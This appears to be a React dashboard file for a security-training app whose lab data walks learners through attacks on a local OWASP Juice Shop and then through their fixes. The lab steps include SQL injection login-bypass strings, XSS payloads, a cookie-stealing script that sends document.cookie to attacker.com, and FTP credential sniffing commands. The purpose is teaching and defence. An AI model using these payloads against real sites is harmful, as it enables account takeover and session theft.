import { useState, Suspense } from "react";
import { Routes, Route, NavLink } from "react-router-dom";
import { useQuery } from "@tanstack/react-query";
import { dashboardApi } from "../api";
import Sidebar          from "../components/layout/Sidebar";
import TopBar           from "../components/layout/TopBar";
import OWASPScanner     from "../components/tools/OWASPScanner";
import MetadataAnalyzer from "../components/tools/MetadataAnalyzer";
import LogAnalyzer      from "../components/tools/LogAnalyzer";
import PcapAnalyzer     from "../components/tools/PcapAnalyzer";
import LabList          from "../components/labs/LabList";
import LabChallenge     from "../components/labs/LabChallenge";

function getUser() {
  try {
    const raw = localStorage.getItem("user");
    return raw ? JSON.parse(raw) : null;
  } catch { return null; }
}

const LABS = [
  {
    id: "sqli-login", title: "SQL injection — login bypass",
    category: "owasp", difficulty: "beginner", owasp_ref: "A04",
    description: "Exploit a classic SQL injection flaw to bypass authentication on a login form.",
    objective: "Bypass the login form without a valid password using SQL injection payloads.",
    hints: [
      "Try entering a single quote ' in the username field and observe the error.",
      "Classic payload: ' OR '1'='1 in the username with anything as password.",
      "Query likely looks like: SELECT * FROM users WHERE email='INPUT' AND password='INPUT'",
    ],
    steps: [
      { id: "s1", title: "Set up Juice Shop",
        instruction: "Run OWASP Juice Shop locally:\n\ndocker run -p 3000:3000 bkimminich/juice-shop\n\nOpen http://localhost:3000/#/login",
        tool_hint: "docker run -p 3000:3000 bkimminich/juice-shop" },
      { id: "s2", title: "Test for SQL injection",
        instruction: "Enter a single quote ' in the email field, anything in password.\nSubmit and observe — a SQL error confirms injectable.",
        expected: "SQLITE_ERROR: unrecognized token",
        tool_hint: "DevTools → Network tab to see raw server response" },
      { id: "s3", title: "Bypass authentication",
        instruction: "Enter in the email field:\n' OR '1'='1'--\n\nAnything as password. Submit.\nYou should be logged in as admin without their password.",
        expected: "Logged in as: admin@juice-sh.op",
        tool_hint: "Burp Suite → Intercept and modify the email parameter" },
      { id: "s4", title: "Scan with ForensiQ",
        instruction: "Go to OWASP Scanner in ForensiQ.\nEnter http://localhost:3000 and run a scan.",
        tool_hint: "ForensiQ → OWASP Scanner" },
      { id: "s5", title: "Understand the fix",
        instruction: "Use parameterised queries:\n\nVulnerable:\nSELECT * FROM users WHERE email='input'\n\nFixed:\nSELECT * FROM users WHERE email = ?\n\nPass value separately so it can never be interpreted as SQL.",
        expected: "db.query('SELECT * FROM users WHERE email = ?', [email])" },
    ],
    progress: 0,
  },
  {
    id: "xss-search", title: "Reflected XSS in search",
    category: "owasp", difficulty: "beginner", owasp_ref: "A04",
    description: "Inject a JavaScript payload into a search field that reflects without sanitisation.",
    objective: "Execute arbitrary JavaScript through a reflected XSS vulnerability.",
    hints: [
      "Look for a search field whose value appears in the page output.",
      "Try: <script>alert(1)</script> in the search field.",
      "If scripts are blocked try: <img src=x onerror=alert(1)>",
    ],
    steps: [
      { id: "s1", title: "Find the reflected input",
        instruction: "Navigate to http://localhost:3000/#/search?q=test\nNotice 'test' appears in the page — input is reflected in HTML." },
      { id: "s2", title: "Inject a script tag",
        instruction: "Replace 'test' with:\n<script>alert(document.domain)</script>\n\nIf an alert fires — the site is vulnerable.",
        expected: "Alert box: localhost",
        tool_hint: "Burp Suite Repeater bypasses browser sanitisation" },
      { id: "s3", title: "Steal a cookie",
        instruction: "Craft a payload:\n<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
        tool_hint: "Use Burp Collaborator as the attacker server" },
      { id: "s4", title: "Understand the fix",
        instruction: "Output-encode all user input before rendering in HTML:\n& → &amp;   < → &lt;   > → &gt;\n\nAlso set a Content-Security-Policy header.",
        expected: "res.setHeader('Content-Security-Policy', \"default-src 'self'\")" },
    ],
    progress: 0,
  },
  {
    id: "idor-orders", title: "IDOR — access other users data",
    category: "owasp", difficulty: "beginner", owasp_ref: "A01",
    description: "Exploit an Insecure Direct Object Reference to view another user's order data.",
    objective: "Access another user's orders by manipulating IDs in API requests.",
    hints: [
      "Look for numeric IDs in API calls: /api/Orders/5",
      "Try changing the ID to 1, 2, 3 — does server return another user's data?",
      "The server must verify the authenticated user owns the resource.",
    ],
    steps: [
      { id: "s1", title: "Find an API call with an ID",
        instruction: "Log in to Juice Shop. Open DevTools → Network.\nGo to Order History. Find: GET /api/Orders/4",
        tool_hint: "DevTools → Network → XHR/Fetch filter" },
      { id: "s2", title: "Change the ID",
        instruction: "Copy into Burp Suite Repeater.\nChange the ID from 4 to 1, 2, 3.\nIf server returns another user's data — that is IDOR.",
        expected: "HTTP 200 with another user's order data" },
      { id: "s3", title: "Understand the fix",
        instruction: "Always authorise on the server:\n\nif (order.userId !== req.user.id) {\n  return res.status(403).json({ error: 'Forbidden' });\n}",
        expected: "Verify resource ownership server-side on every request" },
    ],
    progress: 0,
  },
  {
    id: "exif-gps", title: "EXIF metadata privacy leak",
    category: "metadata", difficulty: "beginner",
    description: "Discover GPS coordinates and device info hidden in image metadata.",
    objective: "Use the Metadata Analyzer to find EXIF data leaking location and device info.",
    hints: [
      "Smartphones embed GPS in photos by default.",
      "Download test images from: https://github.com/ianare/exif-samples",
      "GPS degrees/minutes/seconds can be pasted into Google Maps.",
    ],
    steps: [
      { id: "s1", title: "Get a test image",
        instruction: "Find a JPG taken on a smartphone, or download from exif-samples GitHub.\nMust be a real JPEG — screenshots have no EXIF data." },
      { id: "s2", title: "Analyze with ForensiQ",
        instruction: "ForensiQ → Metadata Analyzer → upload your JPG.\nLook for: GPS GPSLatitude, GPS GPSLongitude, Image Make, Image Model.",
        tool_hint: "ForensiQ → Metadata Analyzer → drop file" },
      { id: "s3", title: "Verify the GPS location",
        instruction: "Copy the GPS coordinates.\nPaste into Google Maps.\nCan you identify exactly where the photo was taken?",
        expected: "Street-level location visible in Google Maps" },
      { id: "s4", title: "Strip the metadata",
        instruction: "Run:\nexiftool -all= photo.jpg\n\nRe-upload to ForensiQ — GPS fields gone, risk count = 0.",
        expected: "0 privacy risks after stripping",
        tool_hint: "choco install exiftool  OR  brew install exiftool" },
    ],
    progress: 0,
  },
  {
    id: "brute-force-logs", title: "Brute force detection in logs",
    category: "logs", difficulty: "intermediate",
    description: "Analyze SSH auth logs to identify a brute force attack and attacker IP.",
    objective: "Use the Log Analyzer to detect brute force patterns and identify the attacking IP.",
    hints: [
      "Look for many 'Failed password' lines from the same IP.",
      "10+ failures from one IP = brute force in our detection rules.",
      "Response: block the IP with fail2ban or a firewall rule.",
    ],
    steps: [
      { id: "s1", title: "Create a test auth.log",
        instruction: "Create auth.log with these lines repeated 15+ times:\n\nMar 21 03:14:22 server sshd[1234]: Failed password for root from 192.168.1.44 port 22 ssh2",
        expected: "auth.log with 15+ failed login lines" },
      { id: "s2", title: "Analyze with ForensiQ",
        instruction: "ForensiQ → Log Analyzer → set type to 'auth.log / syslog' → upload.",
        tool_hint: "ForensiQ → Log Analyzer → Upload file" },
      { id: "s3", title: "Identify the attacker IP",
        instruction: "Find the 'Brute force attack' finding.\nNote attacking IP, attempt count, targeted usernames.",
        expected: "High severity: Brute force attack from 192.168.1.44 (15 attempts)" },
      { id: "s4", title: "Block the attacker",
        instruction: "sudo iptables -A INPUT -s 192.168.1.44 -j DROP\n\nOr automatic:\nsudo apt install fail2ban",
        tool_hint: "sudo apt install fail2ban" },
    ],
    progress: 0,
  },
  {
    id: "pcap-credentials", title: "PCAP credential sniffing",
    category: "pcap", difficulty: "intermediate",
    description: "Analyze a network capture to find plaintext FTP credentials.",
    objective: "Use the PCAP Analyzer to detect unencrypted credentials in a capture file.",
    hints: [
      "FTP sends USER and PASS in plaintext on port 21.",
      "HTTP Basic Auth is base64 — not encryption, trivially decoded.",
      "Capture with: sudo tcpdump -i lo -w capture.pcap",
    ],
    steps: [
      { id: "s1", title: "Capture FTP traffic",
        instruction: "pip install pyftpdlib\npython3 -m pyftpdlib -p 2121\n\nIn another terminal:\nsudo tcpdump -i lo port 2121 -w ftp.pcap &\nftp -P 2121 localhost",
        tool_hint: "pip install pyftpdlib" },
      { id: "s2", title: "Analyze the PCAP",
        instruction: "ForensiQ → PCAP Analyzer → upload ftp.pcap.",
        expected: "Critical: Plaintext FTP credentials captured" },
      { id: "s3", title: "Read the credentials",
        instruction: "Expand the finding and read raw evidence.\nYou should see USER and PASS captured verbatim.",
        expected: "USER anonymous\nPASS test" },
      { id: "s4", title: "Understand the fix",
        instruction: "Replace FTP with SFTP:\n\nsftp user@host\n\nSFTP encrypts both control channel and data channel.",
        expected: "sftp user@host" },
    ],
    progress: 0,
  },
];

const SEV_BADGE = {
  critical: "bg-purple-100 text-purple-700",
  high:     "bg-red-100    text-red-700",
  medium:   "bg-amber-100  text-amber-700",
  low:      "bg-blue-100   text-blue-700",
  info:     "bg-gray-100   text-gray-600",
};

const TOOL_DOT = {
  owasp: "bg-purple-500", metadata: "bg-orange-500",
  logs:  "bg-amber-500",  pcap:     "bg-teal-500",
};

function PageLoader() {
  return (
    <div className="flex items-center justify-center h-full">
      <div className="flex items-center gap-3 text-sm text-gray-400">
        <span className="w-4 h-4 border-2 border-indigo-400 border-t-transparent rounded-full animate-spin" />
        Loading…
      </div>
    </div>
  );
}

function Home() {
  const { data: stats, isLoading: sl } = useQuery({
    queryKey: ["dashboard-stats"],
    queryFn:  dashboardApi.stats,
  });
  const { data: recent, isLoading: rl } = useQuery({
    queryKey: ["recent-findings"],
    queryFn:  dashboardApi.recentFindings,
  });

  const recentList = recent ?? [];
  const statsData  = stats ?? {};

  return (
    <div className="flex flex-col h-full">
      <TopBar title="Overview" subtitle="Your security toolkit dashboard" />
      <div className="flex-1 overflow-y-auto p-6 space-y-6 max-w-4xl">

        <div className="grid grid-cols-4 gap-4">
          {[
            { label: "Scans run",      v: statsData.total_scans,   c: "text-gray-900"  },
            { label: "Total findings", v: statsData.total_findings, c: "text-gray-900"  },
            { label: "High severity",  v: statsData.high_severity,  c: "text-red-600"   },
            { label: "Labs completed", v: statsData.labs_completed, c: "text-green-600" },
          ].map(({ label, v, c }) => (
            <div key={label} className="card">
              <div className="text-xs text-gray-400 mb-2">{label}</div>
              {sl
                ? <div className="h-7 w-12 bg-gray-100 rounded animate-pulse" />
                : <div className={`text-2xl font-semibold ${c}`}>{v ?? 0}</div>}
            </div>
          ))}
        </div>

        <div className="card">
          <div className="text-sm font-medium text-gray-700 mb-4">Recent findings</div>
          {rl ? (
            <div className="space-y-3">
              {[1,2,3].map(i => (
                <div key={i} className="flex gap-3 items-center animate-pulse">
                  <div className="w-2 h-2 rounded-full bg-gray-200" />
                  <div className="flex-1 h-3 bg-gray-100 rounded" />
                  <div className="w-14 h-5 bg-gray-100 rounded-full" />
                </div>
              ))}
            </div>
          ) : recentList.length === 0 ? (
            <p className="text-sm text-gray-400 py-8 text-center">
              No findings yet — run a scan to get started.
            </p>
          ) : (
            <div className="divide-y divide-gray-50">
              {recentList.map(f => (
                <div key={f.id} className="flex items-center gap-3 py-2.5">
                  <span className={`w-1.5 h-1.5 rounded-full flex-shrink-0 ${TOOL_DOT[f.tool] ?? "bg-gray-400"}`} />
                  <div className="flex-1 min-w-0">
                    <div className="text-sm text-gray-800 truncate">{f.title}</div>
                    <div className="text-xs text-gray-400">{f.tool} · {f.target}</div>
                  </div>
                  <span className={`text-xs px-2 py-0.5 rounded-full font-medium capitalize flex-shrink-0
                    ${SEV_BADGE[f.severity] ?? SEV_BADGE.info}`}>
                    {f.severity}
                  </span>
                </div>
              ))}
            </div>
          )}
        </div>

        <div>
          <div className="text-sm font-medium text-gray-700 mb-3">Tools</div>
          <div className="grid grid-cols-2 gap-3">
            {[
              { path: "/dashboard/owasp",    dot: "bg-purple-500", name: "OWASP scanner",    desc: "Test a URL against OWASP Top 10" },
              { path: "/dashboard/metadata", dot: "bg-orange-500", name: "Metadata analyzer", desc: "Extract EXIF, GPS and author data" },
              { path: "/dashboard/logs",     dot: "bg-amber-500",  name: "Log analyzer",      desc: "Detect intrusions in server logs" },
              { path: "/dashboard/pcap",     dot: "bg-teal-500",   name: "PCAP analyzer",     desc: "Inspect network capture files" },
            ].map(({ path, dot, name, desc }) => (
              <NavLink key={path} to={path}
                className="card hover:border-indigo-200 hover:shadow-sm transition-all duration-150 group block">
                <div className="flex items-center gap-2 mb-1.5">
                  <span className={`w-2 h-2 rounded-full ${dot}`} />
                  <span className="text-sm font-medium text-gray-900 group-hover:text-indigo-700 transition-colors">{name}</span>
                </div>
                <p className="text-xs text-gray-500 ml-4">{desc}</p>
              </NavLink>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

function LabsPage() {
  const [labs, setLabs]         = useState(LABS);
  const [selected, setSelected] = useState(null);

  const handleComplete = (labId) => {
    setLabs(prev => prev.map(l =>
      l.id === labId ? { ...l, progress: 100, completed: true } : l
    ));
    setSelected(null);
  };

  const handleSelect = (lab) =>
    setSelected(labs.find(l => l.id === lab.id) ?? lab);

  const completedCount = labs.filter(l => l.progress === 100).length;

  return (
    <div className="flex flex-col h-full">
      <TopBar
        title="Lab challenges"
        subtitle="Hands-on security exercises mapped to real vulnerabilities"
        badge={{ label: `${completedCount} / ${labs.length} completed`, color: "green" }}
      />
      <div className="flex-1 overflow-y-auto p-6 max-w-3xl">
        {selected
          ? <LabChallenge lab={selected} onBack={() => setSelected(null)} onComplete={handleComplete} />
          : <LabList labs={labs} onSelect={handleSelect} />}
      </div>
    </div>
  );
}

export default function Dashboard() {
  const user = getUser();

  return (
    <div className="flex h-screen bg-gray-50 overflow-hidden">
      <Sidebar user={user} />
      <main className="flex-1 overflow-hidden flex flex-col">
        <Suspense fallback={<PageLoader />}>
          <Routes>
            <Route index          element={<Home />} />
            <Route path="owasp"    element={<OWASPScanner />} />
            <Route path="metadata" element={<MetadataAnalyzer />} />
            <Route path="logs"     element={<LogAnalyzer />} />
            <Route path="pcap"     element={<PcapAnalyzer />} />
            <Route path="labs"     element={<LabsPage />} />
          </Routes>
        </Suspense>
      </main>
    </div>
  );
}